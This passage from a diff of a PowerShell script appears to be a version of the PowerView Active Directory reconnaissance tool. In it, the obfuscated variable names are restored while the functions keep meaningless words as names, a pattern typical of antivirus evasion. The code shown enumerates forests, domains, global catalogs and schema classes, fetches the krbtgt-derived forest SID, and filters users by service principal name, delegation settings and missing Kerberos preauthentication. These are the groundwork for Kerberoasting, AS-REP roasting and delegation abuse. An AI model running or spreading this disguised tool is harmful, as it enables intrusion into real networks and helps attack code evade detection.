+            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
+            sonorous @Arguments
         }
         else {
-            $jAPRADZj99 = debater @Arguments
-            if ($jAPRADZj99) {
-                $jAPRADZj99.DomainControllers
+            $FoundDomain = southernmost @Arguments
+            if ($FoundDomain) {
+                $FoundDomain.DomainControllers
             }
         }
     }
 }
-function ampere {
+function chicaneries {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.Management.Automation.PSCustomObject')]
     [CmdletBinding()]
@@ -2081,58 +2081,58 @@ function ampere {
         [Parameter(Position = 0, ValueFromPipeline = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $ZKthMMjt99,
+        $Forest,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
         if ($PSBoundParameters['Credential']) {
-            Write-Verbose "[ampere] Using alternate credentials for ampere"
+            Write-Verbose "[chicaneries] Using alternate credentials for chicaneries"
             if ($PSBoundParameters['Forest']) {
-                $uPNxUikB99 = $ZKthMMjt99
+                $TargetForest = $Forest
             }
             else {
-                $uPNxUikB99 = $gxazvivN99.GetNetworkCredential().Domain
-                Write-Verbose "[ampere] Extracted domain '$ZKthMMjt99' from -Credential"
+                $TargetForest = $Credential.GetNetworkCredential().Domain
+                Write-Verbose "[chicaneries] Extracted domain '$Forest' from -Credential"
             }
-            $UFjiuYZK99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $uPNxUikB99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
+            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             try {
-                $fNjNPsbS99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($UFjiuYZK99)
+                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
             }
             catch {
-                Write-Verbose "[ampere] The specified forest '$uPNxUikB99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
+                Write-Verbose "[chicaneries] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                 $Null
             }
         }
         elseif ($PSBoundParameters['Forest']) {
-            $UFjiuYZK99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $ZKthMMjt99)
+            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
             try {
-                $fNjNPsbS99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($UFjiuYZK99)
+                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
             }
             catch {
-                Write-Verbose "[ampere] The specified forest '$ZKthMMjt99' does not exist, could not be contacted, or there isn't an existing trust: $_"
+                Write-Verbose "[chicaneries] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                 return $Null
             }
         }
         else {
-            $fNjNPsbS99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
         }
-        if ($fNjNPsbS99) {
+        if ($ForestObject) {
             if ($PSBoundParameters['Credential']) {
-                $KNgdfcEE99 = (township -Identity "krbtgt" -Domain $fNjNPsbS99.RootDomain.Name -Credential $gxazvivN99).objectsid
+                $ForestSid = (prissier -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
             }
             else {
-                $KNgdfcEE99 = (township -Identity "krbtgt" -Domain $fNjNPsbS99.RootDomain.Name).objectsid
+                $ForestSid = (prissier -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
             }
-            $Parts = $KNgdfcEE99 -Split '-'
-            $KNgdfcEE99 = $Parts[0..$($Parts.length-2)] -join '-'
-            $fNjNPsbS99 | Add-Member NoteProperty 'RootDomainSid' $KNgdfcEE99
-            $fNjNPsbS99
+            $Parts = $ForestSid -Split '-'
+            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
+            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
+            $ForestObject
         }
     }
 }
-function employing {
+function surcharge {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
     [CmdletBinding()]
@@ -2140,22 +2140,22 @@ function employing {
         [Parameter(Position = 0, ValueFromPipeline = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $ZKthMMjt99,
+        $Forest,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        $vScLHGBn99 = @{}
-        if ($PSBoundParameters['Forest']) { $vScLHGBn99['Forest'] = $ZKthMMjt99 }
-        if ($PSBoundParameters['Credential']) { $vScLHGBn99['Credential'] = $gxazvivN99 }
-        $fNjNPsbS99 = ampere @Arguments
-        if ($fNjNPsbS99) {
-            $fNjNPsbS99.Domains
+        $Arguments = @{}
+        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
+        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
+        $ForestObject = chicaneries @Arguments
+        if ($ForestObject) {
+            $ForestObject.Domains
         }
     }
 }
-function spontaneous {
+function Jamaican {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
     [CmdletBinding()]
@@ -2163,22 +2163,22 @@ function spontaneous {
         [Parameter(Position = 0, ValueFromPipeline = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $ZKthMMjt99,
+        $Forest,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        $vScLHGBn99 = @{}
-        if ($PSBoundParameters['Forest']) { $vScLHGBn99['Forest'] = $ZKthMMjt99 }
-        if ($PSBoundParameters['Credential']) { $vScLHGBn99['Credential'] = $gxazvivN99 }
-        $fNjNPsbS99 = ampere @Arguments
-        if ($fNjNPsbS99) {
-            $fNjNPsbS99.FindAllGlobalCatalogs()
+        $Arguments = @{}
+        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
+        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
+        $ForestObject = chicaneries @Arguments
+        if ($ForestObject) {
+            $ForestObject.FindAllGlobalCatalogs()
         }
     }
 }
-function kimonos {
+function dreamy {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
     [CmdletBinding()]
@@ -2187,33 +2187,33 @@ function kimonos {
         [Alias('Class')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $xwoRVUyD99,
+        $ClassName,
         [Alias('Name')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $ZKthMMjt99,
+        $Forest,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        $vScLHGBn99 = @{}
-        if ($PSBoundParameters['Forest']) { $vScLHGBn99['Forest'] = $ZKthMMjt99 }
-        if ($PSBoundParameters['Credential']) { $vScLHGBn99['Credential'] = $gxazvivN99 }
-        $fNjNPsbS99 = ampere @Arguments
-        if ($fNjNPsbS99) {
+        $Arguments = @{}
+        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
+        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
+        $ForestObject = chicaneries @Arguments
+        if ($ForestObject) {
             if ($PSBoundParameters['ClassName']) {
-                ForEach ($ZugBVagP99 in $xwoRVUyD99) {
-                    $fNjNPsbS99.Schema.FindClass($ZugBVagP99)
+                ForEach ($TargetClass in $ClassName) {
+                    $ForestObject.Schema.FindClass($TargetClass)
                 }
             }
             else {
-                $fNjNPsbS99.Schema.FindAllClasses()
+                $ForestObject.Schema.FindAllClasses()
             }
         }
     }
 }
-function framer {
+function hoodwinked {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.PropertyOutlier')]
     [CmdletBinding(DefaultParameterSetName = 'ClassName')]
@@ -2222,115 +2222,115 @@ function framer {
         [Alias('Class')]
         [ValidateSet('User', 'Group', 'Computer')]
         [String]
-        $xwoRVUyD99,
+        $ClassName,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $CcOGhxIw99,
+        $ReferencePropertySet,
         [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
         [PSCustomObject]
-        $GmmvNchI99,
+        $ReferenceObject,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $nihwcVco99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
-        $jiTKeKNG99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
-        $rECGWYqZ99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
+        $UserReferencePropertySet = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
+        $GroupReferencePropertySet = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
+        $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['Domain']) {
             if ($PSBoundParameters['Credential']) {
-                $uPNxUikB99 = debater -Domain $SSNUOPgW99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
+                $TargetForest = southernmost -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
             }
             else {
-                $uPNxUikB99 = debater -Domain $SSNUOPgW99 -Credential $gxazvivN99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
+                $TargetForest = southernmost -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
             }
-            Write-Verbose "[framer] Enumerated forest '$uPNxUikB99' for target domain '$SSNUOPgW99'"
+            Write-Verbose "[hoodwinked] Enumerated forest '$TargetForest' for target domain '$Domain'"
         }
-        $bKAVLSff99 = @{}
-        if ($PSBoundParameters['Credential']) { $bKAVLSff99['Credential'] = $gxazvivN99 }
-        if ($uPNxUikB99) {
-            $bKAVLSff99['Forest'] = $uPNxUikB99
+        $SchemaArguments = @{}
+        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }
+        if ($TargetForest) {
+            $SchemaArguments['Forest'] = $TargetForest
         }
     }
     PROCESS {
         if ($PSBoundParameters['ReferencePropertySet']) {
-            Write-Verbose "[framer] Using specified -ReferencePropertySet"
-            $xcBepLig99 = $CcOGhxIw99
+            Write-Verbose "[hoodwinked] Using specified -ReferencePropertySet"
+            $ReferenceObjectProperties = $ReferencePropertySet
         }
         elseif ($PSBoundParameters['ReferenceObject']) {
-            Write-Verbose "[framer] Extracting property names from -ReferenceObject to use as the reference property set"
-            $xcBepLig99 = Get-Member -InputObject $GmmvNchI99 -MemberType NoteProperty | Select-Object -Expand Name
-            $hjRkFZSH99 = $GmmvNchI99.objectclass | Select-Object -Last 1
-            Write-Verbose "[framer] Calculated ReferenceObjectClass : $hjRkFZSH99"
+            Write-Verbose "[hoodwinked] Extracting property names from -ReferenceObject to use as the reference property set"
+            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
+            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
+            Write-Verbose "[hoodwinked] Calculated ReferenceObjectClass : $ReferenceObjectClass"
         }
         else {
-            Write-Verbose "[framer] Using the default reference property set for the object class '$xwoRVUyD99'"
+            Write-Verbose "[hoodwinked] Using the default reference property set for the object class '$ClassName'"
         }
-        if (($xwoRVUyD99 -eq 'User') -or ($hjRkFZSH99 -eq 'User')) {
-            $SXgZNvub99 = township @SearcherArguments
-            if (-not $xcBepLig99) {
-                $xcBepLig99 = $nihwcVco99
+        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {
+            $Objects = prissier @SearcherArguments
+            if (-not $ReferenceObjectProperties) {
+                $ReferenceObjectProperties = $UserReferencePropertySet
             }
         }
-        elseif (($xwoRVUyD99 -eq 'Group') -or ($hjRkFZSH99 -eq 'Group')) {
-            $SXgZNvub99 = burlap @SearcherArguments
-            if (-not $xcBepLig99) {
-                $xcBepLig99 = $jiTKeKNG99
+        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {
+            $Objects = typing @SearcherArguments
+            if (-not $ReferenceObjectProperties) {
+                $ReferenceObjectProperties = $GroupReferencePropertySet
             }
         }
-        elseif (($xwoRVUyD99 -eq 'Computer') -or ($hjRkFZSH99 -eq 'Computer')) {
-            $SXgZNvub99 = doubtlessly @SearcherArguments
-            if (-not $xcBepLig99) {
-                $xcBepLig99 = $rECGWYqZ99
+        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {
+            $Objects = sonorous @SearcherArguments
+            if (-not $ReferenceObjectProperties) {
+                $ReferenceObjectProperties = $ComputerReferencePropertySet
             }
         }
         else {
-            throw "[framer] Invalid class: $xwoRVUyD99"
+            throw "[hoodwinked] Invalid class: $ClassName"
         }
-        ForEach ($Object in $SXgZNvub99) {
-            $yqsVbWpr99 = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
-            ForEach($lmxrXBry99 in $yqsVbWpr99) {
-                if ($xcBepLig99 -NotContains $lmxrXBry99) {
+        ForEach ($Object in $Objects) {
+            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
+            ForEach($ObjectProperty in $ObjectProperties) {
+                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                     $Out = New-Object PSObject
                     $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
-                    $Out | Add-Member Noteproperty 'Property' $lmxrXBry99
-                    $Out | Add-Member Noteproperty 'Value' $Object.$lmxrXBry99
+                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty
+                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty
                     $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                     $Out
                 }
@@ -2338,7 +2338,7 @@ function framer {
         }
     }
 }
-function township {
+function prissier {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.User')]
@@ -2348,193 +2348,193 @@ function township {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [Switch]
         $SPN,
         [Switch]
-        $wfGmLtet99,
+        $AdminCount,
         [Parameter(ParameterSetName = 'AllowDelegation')]
         [Switch]
-        $XHXWJfxF99,
+        $AllowDelegation,
         [Parameter(ParameterSetName = 'DisallowDelegation')]
         [Switch]
-        $sIuAAnvX99,
+        $DisallowDelegation,
         [Switch]
-        $cfgWMxwo99,
+        $TrustedToAuth,
         [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
         [Switch]
-        $xwvOnvpy99,
+        $PreauthNotRequired,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     DynamicParam {
-        $aButQqsr99 = [Enum]::GetNames($oqUiXgaF99)
-        $aButQqsr99 = $aButQqsr99 | ForEach-Object {$_; "NOT_$_"}
-        coup -Name UACFilter -ValidateSet $aButQqsr99 -Type ([array])
+        $UACValueNames = [Enum]::GetNames($UACEnum)
+        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
+        footnotes -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $llxUonve99 = watersides @SearcherArguments
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $UserSearcher = deadly @SearcherArguments
     }
     PROCESS {
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            coup -CreateVariables -BoundParameters $PSBoundParameters
+            footnotes -CreateVariables -BoundParameters $PSBoundParameters
         }
-        if ($llxUonve99) {
-            $afFJXkRc99 = ''
-            $kXbEpVCq99 = ''
-            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                if ($QghnbJOP99 -match '^S-1-') {
-                    $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
+        if ($UserSearcher) {
+            $IdentityFilter = ''
+            $Filter = ''
+            $Identity | Where-Object {$_} | ForEach-Object {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^S-1-') {
+                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
-                elseif ($QghnbJOP99 -match '^CN=') {
-                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+                elseif ($IdentityInstance -match '^CN=') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[township] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                        $PPosolen99['Domain'] = $BvhyhWZG99
-                        $llxUonve99 = watersides @SearcherArguments
-                        if (-not $llxUonve99) {
-                            Write-Warning "[township] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[prissier] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $UserSearcher = deadly @SearcherArguments
+                        if (-not $UserSearcher) {
+                            Write-Warning "[prissier] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
-                elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
-                    $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
-                    $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                    $IdentityFilter += "(objectguid=$GuidByteString)"
                 }
-                elseif ($QghnbJOP99.Contains('\')) {
-                    $TzefbTEv99 = $QghnbJOP99.Replace('\28', '(').Replace('\29', ')') | kinsman -OutputType Canonical
-                    if ($TzefbTEv99) {
-                        $ojqqfkye99 = $TzefbTEv99.SubString(0, $TzefbTEv99.IndexOf('/'))
-                        $IsWOPBva99 = $QghnbJOP99.Split('\')[1]
-                        $afFJXkRc99 += "(samAccountName=$IsWOPBva99)"
-                        $PPosolen99['Domain'] = $ojqqfkye99
-                        Write-Verbose "[township] Extracted domain '$ojqqfkye99' from '$QghnbJOP99'"
-                        $llxUonve99 = watersides @SearcherArguments
+                elseif ($IdentityInstance.Contains('\')) {
+                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | corralling -OutputType Canonical
+                    if ($ConvertedIdentityInstance) {
+                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
+                        $UserName = $IdentityInstance.Split('\')[1]
+                        $IdentityFilter += "(samAccountName=$UserName)"
+                        $SearcherArguments['Domain'] = $UserDomain
+                        Write-Verbose "[prissier] Extracted domain '$UserDomain' from '$IdentityInstance'"
+                        $UserSearcher = deadly @SearcherArguments
                     }
                 }
                 else {
-                    $afFJXkRc99 += "(samAccountName=$QghnbJOP99)"
+                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                 }
             }
-            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                $kXbEpVCq99 += "(|$afFJXkRc99)"
+            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                $Filter += "(|$IdentityFilter)"
             }
             if ($PSBoundParameters['SPN']) {
-                Write-Verbose '[township] Searching for non-null service principal names'
-                $kXbEpVCq99 += '(servicePrincipalName=*)'
+                Write-Verbose '[prissier] Searching for non-null service principal names'
+                $Filter += '(servicePrincipalName=*)'
             }
             if ($PSBoundParameters['AllowDelegation']) {
-                Write-Verbose '[township] Searching for users who can be delegated'
-                $kXbEpVCq99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
+                Write-Verbose '[prissier] Searching for users who can be delegated'
+                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
             }
             if ($PSBoundParameters['DisallowDelegation']) {
-                Write-Verbose '[township] Searching for users who are sensitive and not trusted for delegation'
